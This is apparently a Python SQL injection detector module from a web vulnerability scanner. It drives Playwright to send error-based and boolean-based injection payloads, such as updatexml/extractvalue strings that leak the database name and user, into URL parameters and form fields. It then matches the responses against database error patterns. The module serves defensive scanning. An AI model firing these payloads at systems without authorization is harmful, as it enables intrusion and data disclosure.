# detectors/sql_detector.py

import re
import html
from difflib import SequenceMatcher
from urllib.parse import (
    urlparse, urlunparse, parse_qsl, urlencode, urljoin, unquote_plus
)

from services.scan_store import add_log, add_vulnerability


SQL_ERROR_PATTERNS = [
    r"you have an error in your sql syntax",
    r"warning:\s*mysql",
    r"warning:\s*mysqli",
    r"supplied argument is not a valid mysql",
    r"unclosed quotation mark after the character string",
    r"quoted string not properly terminated",
    r"microsoft ole db provider for sql server",
    r"sqlstate\[[^\]]+\]",
    r"sqlite error",
    r"sqlite_exception",
    r"postgresql.*error",
    r"psycopg2\.",
    r"ora-\d{5}",
    r"xpath syntax error"
]

NOISY_ERROR_KEYWORDS = [
    'traceback',
    'exception',
    'zerodivisionerror',
    'internal server error'
]

SQL_URL_ERROR_PAYLOADS_NUMERIC = [
    "1'",
    "1 and updatexml(1,concat(0x7e,database(),0x7e),1)#",
    "1 and extractvalue(1,concat(0x7e,user(),0x7e))#"
]

SQL_URL_ERROR_PAYLOADS_STRING = [
    "'",
    "1' #",
    "1' and updatexml(1,concat(0x7e,database(),0x7e),1)#",
    "1' and extractvalue(1,concat(0x7e,user(),0x7e))#"
]

SQL_URL_BOOLEAN_PAYLOADS_NUMERIC = [
    ("1 and 1=1#", "1 and 1=2#"),
    ("1 or 1=1#", "1 or 1=2#")
]

SQL_URL_BOOLEAN_PAYLOADS_STRING = [
    ("1' and '1'='1'#", "1' and '1'='2'#"),
    ("1' or '1'='1'#", "1' or '1'='2'#")
]

SQL_FORM_ERROR_PAYLOADS_NUMERIC = [
    "1'",
    "1 and updatexml(1,concat(0x7e,database(),0x7e),1)#",
    "1 and extractvalue(1,concat(0x7e,user(),0x7e))#"
]

SQL_FORM_ERROR_PAYLOADS_STRING = [
    "'",
    "test' ",
    "test' #",
    "test' and updatexml(1,concat(0x7e,database(),0x7e),1)#",
    "test' and extractvalue(1,concat(0x7e,user(),0x7e))#"
]

SQL_FORM_BOOLEAN_PAYLOADS_NUMERIC = [
    ("1 and 1=1#", "1 and 1=2#"),
    ("1 or 1=1#", "1 or 1=2#")
]

SQL_FORM_BOOLEAN_PAYLOADS_STRING = [
    ("test' and '1'='1'#", "test' and '1'='2'#"),
    ("test' or '1'='1'#", "test' or '1'='2'#")
]

TEXT_INPUT_TYPES = {"", "text", "search", "url", "email", "number", "tel"}


def normalize_response_text(raw_html, payloads=None):
    if not raw_html:
        return ''

    text = html.unescape(unquote_plus(raw_html)).lower()
    text = re.sub(r'(?is)<script.*?>.*?</script>', ' ', text)
    text = re.sub(r'(?is)<style.*?>.*?</style>', ' ', text)
    text = re.sub(r'(?is)<[^>]+>', ' ', text)

    for payload in payloads or []:
        if not payload:
            continue
        candidates = {
            payload.lower(),
            html.unescape(payload).lower(),
            unquote_plus(payload).lower(),
        }
        for item in candidates:
            text = text.replace(item, ' ')

    text = re.sub(r'\s+', ' ', text).strip()
    return text


def find_sql_error_patterns(raw_html, payloads=None):
    text = normalize_response_text(raw_html, payloads=payloads)
    hits = []

    for pattern in SQL_ERROR_PATTERNS:
        m = re.search(pattern, text, flags=re.I)
        if m:
            hits.append(m.group(0))

    return list(dict.fromkeys(hits))


def find_new_sql_errors(base_html, test_html, payload):
    base_hits = set(find_sql_error_patterns(base_html))
    test_hits = set(find_sql_error_patterns(test_html, payloads=[payload]))
    return list(test_hits - base_hits)


def is_noisy_error_page(status_code, raw_html):
    text = normalize_response_text(raw_html)
    if status_code >= 500:
        return True
    return any(k in text for k in NOISY_ERROR_KEYWORDS)


def is_meaningful_boolean_difference(base_html, true_html, false_html, true_payload, false_payload):
    base_text = normalize_response_text(base_html)
    true_text = normalize_response_text(true_html, payloads=[true_payload])
    false_text = normalize_response_text(false_html, payloads=[false_payload])

    if not base_text or not true_text or not false_text:
        return False
    if true_text == false_text:
        return False

    sim_true = SequenceMatcher(None, base_text[:5000], true_text[:5000]).ratio()
    sim_false = SequenceMatcher(None, base_text[:5000], false_text[:5000]).ratio()
    sim_true_false = SequenceMatcher(None, true_text[:5000], false_text[:5000]).ratio()
    length_diff = abs(len(true_text) - len(false_text))

    return (sim_true - sim_false) > 0.12 and sim_true_false < 0.95 and length_diff > 30


def is_probably_numeric_field(field_name, field_value=''):
    name = (field_name or '').lower()
    value = str(field_value or '').strip()

    numeric_keywords = ['id', 'uid', 'num', 'page', 'pid']
    if any(keyword in name for keyword in numeric_keywords):
        return True
    if value.isdigit():
        return True
    return False


def get_url_sqli_payloads(field_name, field_value=''):
    if is_probably_numeric_field(field_name, field_value):
        return SQL_URL_ERROR_PAYLOADS_NUMERIC, SQL_URL_BOOLEAN_PAYLOADS_NUMERIC
    return SQL_URL_ERROR_PAYLOADS_STRING, SQL_URL_BOOLEAN_PAYLOADS_STRING


def get_form_sqli_payloads(field_name, field_value=''):
    if is_probably_numeric_field(field_name, field_value):
        return SQL_FORM_ERROR_PAYLOADS_NUMERIC, SQL_FORM_BOOLEAN_PAYLOADS_NUMERIC
    return SQL_FORM_ERROR_PAYLOADS_STRING, SQL_FORM_BOOLEAN_PAYLOADS_STRING


def get_query_param_names(url):
    parsed = urlparse(url)
    params = dict(parse_qsl(parsed.query, keep_blank_values=True))
    return list(params.keys())


def build_test_url(url, param_name, param_value):
    parsed = urlparse(url)
    params = dict(parse_qsl(parsed.query, keep_blank_values=True))
    params[param_name] = param_value
    new_query = urlencode(params, doseq=True)

    return urlunparse((
        parsed.scheme,
        parsed.netloc,
        parsed.path,
        parsed.params,
        new_query,
        parsed.fragment
    ))


def fetch_page_snapshot(context, url):
    page = context.new_page()
    try:
        response = page.goto(url, wait_until='networkidle', timeout=15000)
        status_code = response.status if response else 200
        html_text = page.content()
        return status_code, html_text
    finally:
        page.close()


def extract_forms(page, current_url):
    forms = page.eval_on_selector_all(
        'form',
        """
        forms => forms.map((form, index) => ({
            index: index,
            method: (form.getAttribute('method') || 'get').toLowerCase(),
            action: form.getAttribute('action') || '',
            controls: Array.from(form.querySelectorAll('input, textarea, select')).map(el => ({
                name: el.name || '',
                type: (el.type || '').toLowerCase(),
                tag: el.tagName.toLowerCase(),
                value: el.value || '',
                checked: !!el.checked
            }))
        }))
        """
    )

    result = []
    for form in forms:
        action = form.get('action') or ''
        form['action_url'] = urljoin(current_url, action) if action else current_url
        result.append(form)

    return result


def build_get_form_url(action_url, controls, target_name, target_value):
    parsed = urlparse(action_url)
    params = dict(parse_qsl(parsed.query, keep_blank_values=True))

    for control in controls:
        name = control.get('name', '')
        control_type = (control.get('type') or '').lower()
        tag = (control.get('tag') or '').lower()
        value = control.get('value', '')
        checked = control.get('checked', False)

        if not name:
            continue
        if control_type in {'submit', 'button', 'reset', 'image', 'file'}:
            continue
        if control_type in {'checkbox', 'radio'}:
            if checked:
                params[name] = value or 'on'
            continue
        if control_type == 'hidden':
            params[name] = value or ''
            continue

        if name == target_name:
            params[name] = target_value
        elif tag == 'textarea' or control_type in TEXT_INPUT_TYPES:
            params[name] = value or '1'
        else:
            params[name] = value or '1'

    new_query = urlencode(params, doseq=True)

    return urlunparse((
        parsed.scheme,
        parsed.netloc,
        parsed.path,
        parsed.params,
        new_query,
        parsed.fragment
    ))


def submit_post_form_snapshot(context, current_url, form_index, controls, target_name, target_value):
    page = context.new_page()
    try:
        page.goto(current_url, wait_until='networkidle', timeout=15000)
        forms = page.locator('form')

        if forms.count() <= form_index:
            return page.url, 200, page.content()

        form = forms.nth(form_index)

        for control in controls:
            name = control.get('name', '')
            control_type = (control.get('type') or '').lower()
            tag = (control.get('tag') or '').lower()
            value = control.get('value', '')

            if not name:
                continue
            if control_type in {'hidden', 'submit', 'button', 'reset', 'image', 'file', 'checkbox', 'radio'}:
                continue

            locator = form.locator(f'[name="{name}"]').first
            if locator.count() == 0:
                continue

            fill_value = target_value if name == target_name else (value or '1')

            if tag == 'textarea' or control_type in TEXT_INPUT_TYPES:
                try:
                    locator.fill(fill_value)
                except Exception:
                    pass

        status_code = 200
        nav_response = None

        try:
            submit_btn = form.locator('input[type="submit"], button[type="submit"], button').first
            if submit_btn.count() > 0:
                try:
                    with page.expect_navigation(wait_until='networkidle', timeout=10000) as nav:
                        submit_btn.click()
                    nav_response = nav.value
                except Exception:
                    submit_btn.click()
                    page.wait_for_timeout(1500)
            else:
                try:
                    with page.expect_navigation(wait_until='networkidle', timeout=10000) as nav:
                        form.evaluate('(form) => form.submit()')
                    nav_response = nav.value
                except Exception:
                    form.evaluate('(form) => form.submit()')
                    page.wait_for_timeout(1500)

            if nav_response:
                status_code = nav_response.status

        except Exception:
            page.wait_for_timeout(1500)

        html_text = page.content()
        return page.url, status_code, html_text

    finally:
        page.close()


def detect_url_sql_injection(context, task_id, page_id, current_url):
    param_names = get_query_param_names(current_url)
    if not param_names:
        add_log(task_id, 'INFO', f'SQL-URL检测跳过：{current_url}，无URL参数')
        return False

    try:
        base_status, base_html = fetch_page_snapshot(context, current_url)
    except Exception as e:
        add_log(task_id, 'ERROR', f'SQL-URL检测失败：{current_url}，原因：{str(e)}')
        return False

    if is_noisy_error_page(base_status, base_html):
        add_log(task_id, 'INFO', f'SQL-URL检测跳过：{current_url}，基线页本身为异常/调试页')
        return False

    for param_name in param_names[:3]:
        error_payloads, boolean_payloads = get_url_sqli_payloads(param_name, '1')

        for payload in error_payloads:
            test_url = build_test_url(current_url, param_name, payload)
            try:
                test_status, test_html = fetch_page_snapshot(context, test_url)
            except Exception:
                continue

            new_errors = find_new_sql_errors(base_html, test_html, payload)

            if new_errors:
                add_vulnerability(
                    task_id=task_id,
                    page_id=page_id,
                    vuln_name='潜在SQL注入风险',
                    vuln_type='SQLi',
                    risk_level=3,
                    page_url=current_url,
                    param_name=param_name,
                    param_position='URL参数',
                    payload=payload,
                    vuln_desc='系统对 URL 参数进行异常输入测试后，页面出现新的数据库错误特征，存在潜在 SQL 注入风险。',
                    evidence=f'参数 {param_name} 使用载荷 {payload} 后新增数据库错误特征：{", ".join(new_errors[:3])}',
                    suggestion='使用参数化查询，避免字符串拼接 SQL；对输入参数进行严格校验，并隐藏数据库异常信息。'
                )
                add_log(task_id, 'INFO', f'SQL-URL检测命中：{current_url} 参数 {param_name}')
                return True

            if base_status < 500 and test_status >= 500 and new_errors:
                add_vulnerability(
                    task_id=task_id,
                    page_id=page_id,
                    vuln_name='潜在SQL注入风险',
                    vuln_type='SQLi',
                    risk_level=3,
                    page_url=current_url,
                    param_name=param_name,
                    param_position='URL参数',
                    payload=payload,
                    vuln_desc='系统对 URL 参数进行异常输入测试后，页面状态异常且伴随新的数据库错误特征，存在潜在 SQL 注入风险。',
                    evidence=f'基线状态码 {base_status}，测试状态码 {test_status}；新增错误特征：{", ".join(new_errors[:3])}',
                    suggestion='使用参数化查询，避免字符串拼接 SQL；对输入参数进行严格校验，并隐藏数据库异常信息。'
                )
                add_log(task_id, 'INFO', f'SQL-URL检测命中：{current_url} 参数 {param_name}')
                return True

        for true_payload, false_payload in boolean_payloads:
            true_url = build_test_url(current_url, param_name, true_payload)
            false_url = build_test_url(current_url, param_name, false_payload)

            try:
                _, true_html = fetch_page_snapshot(context, true_url)
                _, false_html = fetch_page_snapshot(context, false_url)
            except Exception:
                continue

            if is_meaningful_boolean_difference(base_html, true_html, false_html, true_payload, false_payload):
                add_vulnerability(
                    task_id=task_id,
                    page_id=page_id,
                    vuln_name='潜在SQL注入风险',
                    vuln_type='SQLi',
                    risk_level=3,
                    page_url=current_url,
                    param_name=param_name,
                    param_position='URL参数',
                    payload=f'{true_payload} / {false_payload}',
                    vuln_desc='系统对 URL 参数进行真假条件差异测试后，页面响应出现明显差异，存在潜在 SQL 注入风险。',
                    evidence=f'参数 {param_name} 在真假条件测试下返回页面差异明显',
                    suggestion='使用参数化查询，避免字符串拼接 SQL；对输入参数进行类型限制和白名单校验。'
                )
                add_log(task_id, 'INFO', f'SQL-URL检测命中：{current_url} 参数 {param_name}')
                return True

    add_log(task_id, 'INFO', f'SQL-URL检测结束：{current_url}，未命中')
    return False


def detect_form_sql_injection(context, task_id, page_id, current_url, page):
    forms = extract_forms(page, current_url)
    add_log(task_id, 'INFO', f'SQL-表单检测开始：{current_url}，发现表单 {len(forms)} 个')

    if not forms:
        add_log(task_id, 'INFO', f'SQL-表单检测结束：{current_url}，无表单')
        return False

    for form in forms[:3]:
        method = form.get('method', 'get').lower()
        controls = form.get('controls', [])
        form_index = form.get('index', 0)
        action_url = form.get('action_url', current_url)

        candidate_fields = []
        for control in controls:
            name = control.get('name', '')
            control_type = (control.get('type') or '').lower()
            tag = (control.get('tag') or '').lower()
            value = control.get('value', '')

            if not name:
                continue
            if tag == 'textarea' or control_type in TEXT_INPUT_TYPES:
                candidate_fields.append({'name': name, 'value': value})

        if not candidate_fields:
            continue

        for field in candidate_fields[:3]:
            field_name = field.get('name')
            field_value = field.get('value', '')
            error_payloads, boolean_payloads = get_form_sqli_payloads(field_name, field_value)

            try:
                if method == 'get':
                    base_url = build_get_form_url(action_url, controls, field_name, field_value or '1')
                    base_status, base_html = fetch_page_snapshot(context, base_url)
                else:
                    _, base_status, base_html = submit_post_form_snapshot(
                        context, current_url, form_index, controls, field_name, field_value or '1'
                    )
            except Exception:
                continue

            if is_noisy_error_page(base_status, base_html):
                add_log(task_id, 'INFO', f'SQL-表单检测跳过：{current_url} 字段 {field_name}，基线页本身为异常/调试页')
                continue

            for payload in error_payloads:
                try:
                    if method == 'get':
                        test_url = build_get_form_url(action_url, controls, field_name, payload)
                        test_status, test_html = fetch_page_snapshot(context, test_url)
                    else:
                        _, test_status, test_html = submit_post_form_snapshot(
                            context, current_url, form_index, controls, field_name, payload
                        )
                except Exception:
                    continue

                new_errors = find_new_sql_errors(base_html, test_html, payload)

                if new_errors:
                    add_vulnerability(
                        task_id=task_id,
                        page_id=page_id,
                        vuln_name='潜在SQL注入风险',
                        vuln_type='SQLi',
                        risk_level=3,
                        page_url=current_url,
                        param_name=field_name,
                        param_position='GET表单参数' if method == 'get' else 'POST表单参数',
                        payload=payload,
                        vuln_desc='系统通过 Playwright 自动填写表单并提交检测语句后，页面出现新的数据库错误特征，存在潜在 SQL 注入风险。',
                        evidence=f'表单字段 {field_name} 使用载荷 {payload} 后新增数据库错误特征：{", ".join(new_errors[:3])}',
                        suggestion='使用参数化查询，避免字符串拼接 SQL；对表单输入进行严格校验，并隐藏数据库异常信息。'
                    )
                    add_log(task_id, 'INFO', f'SQL-表单检测命中：{current_url} 字段 {field_name}')
                    return True

                if base_status < 500 and test_status >= 500 and new_errors:
                    add_vulnerability(
                        task_id=task_id,
                        page_id=page_id,
                        vuln_name='潜在SQL注入风险',
                        vuln_type='SQLi',
                        risk_level=3,
                        page_url=current_url,
                        param_name=field_name,
                        param_position='GET表单参数' if method == 'get' else 'POST表单参数',
                        payload=payload,
                        vuln_desc='系统通过 Playwright 自动填写表单并提交检测语句后，页面状态异常且伴随新的数据库错误特征，存在潜在 SQL 注入风险。',
                        evidence=f'基线状态码 {base_status}，测试状态码 {test_status}；新增错误特征：{", ".join(new_errors[:3])}',
                        suggestion='使用参数化查询，避免字符串拼接 SQL；对表单输入进行严格校验，并隐藏数据库异常信息。'
                    )
                    add_log(task_id, 'INFO', f'SQL-表单检测命中：{current_url} 字段 {field_name}')
                    return True

            for true_payload, false_payload in boolean_payloads:
                try:
                    if method == 'get':
                        true_url = build_get_form_url(action_url, controls, field_name, true_payload)
                        false_url = build_get_form_url(action_url, controls, field_name, false_payload)
                        _, true_html = fetch_page_snapshot(context, true_url)
                        _, false_html = fetch_page_snapshot(context, false_url)
                    else:
                        _, _, true_html = submit_post_form_snapshot(
                            context, current_url, form_index, controls, field_name, true_payload
                        )
                        _, _, false_html = submit_post_form_snapshot(
                            context, current_url, form_index, controls, field_name, false_payload
                        )
                except Exception:
                    continue

                if is_meaningful_boolean_difference(base_html, true_html, false_html, true_payload, false_payload):
                    add_vulnerability(
                        task_id=task_id,
                        page_id=page_id,
                        vuln_name='潜在SQL注入风险',
                        vuln_type='SQLi',
                        risk_level=3,
                        page_url=current_url,
                        param_name=field_name,
                        param_position='GET表单参数' if method == 'get' else 'POST表单参数',
                        payload=f'{true_payload} / {false_payload}',
                        vuln_desc='系统通过 Playwright 自动填写表单并对真假条件分别提交后，页面响应存在明显差异，存在潜在 SQL 注入风险。',
                        evidence=f'表单字段 {field_name} 在真假条件测试下返回页面差异明显',
                        suggestion='使用参数化查询，避免字符串拼接 SQL；同时对输入参数进行类型限制和白名单校验。'
                    )
                    add_log(task_id, 'INFO', f'SQL-表单检测命中：{current_url} 字段 {field_name}')
                    return True

    add_log(task_id, 'INFO', f'SQL-表单检测结束：{current_url}，未命中')
    return False


def detect_sql_injection(context, task_id, page_id, current_url, page):
    add_log(task_id, 'INFO', f'SQL检测开始：{current_url}')

    if detect_url_sql_injection(context, task_id, page_id, current_url):
        return True

    if detect_form_sql_injection(context, task_id, page_id, current_url, page):
        return True

    add_log(task_id, 'INFO', f'SQL检测结束：{current_url}，未发现SQL注入特征')
    return False